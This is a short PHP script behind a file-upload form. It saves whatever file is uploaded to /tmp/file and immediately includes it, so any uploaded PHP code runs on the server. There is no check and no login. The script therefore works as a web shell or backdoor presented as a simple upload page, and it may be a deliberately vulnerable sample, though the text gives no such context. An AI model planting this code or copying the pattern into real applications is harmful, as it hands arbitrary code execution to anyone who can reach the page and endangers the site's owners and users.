<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="input" id="input">
    <input type="submit" value="Upload File" name="submit">
</form>

<?php
$output = "/tmp/file";
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (move_uploaded_file($_FILES["input"]["tmp_name"], $output)) {
   	    include $output;
    }
} 
?>